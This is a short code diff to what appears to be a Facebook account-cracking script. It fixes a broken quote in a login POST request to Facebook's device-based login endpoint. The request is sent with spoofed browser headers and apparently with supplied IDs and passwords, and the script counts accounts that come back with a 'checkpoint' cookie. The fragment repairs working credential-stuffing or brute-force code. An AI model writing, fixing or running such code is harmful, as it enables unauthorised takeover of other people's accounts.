@@ -918,7 +918,7 @@ def m1(idf,pwv):
            'x-xss-protection': '0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0'})
-            yz = session.post(f'https://x.facebook.com/login/device-based/regular/login, headers=respons, data=date)
+            yz = session.post(f'https://x.facebook.com/login/device-based/regular/login', headers=respons, data=date)
             if "checkpoint" in session.cookies.get_dict().keys():
              idd = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
              cp+=1
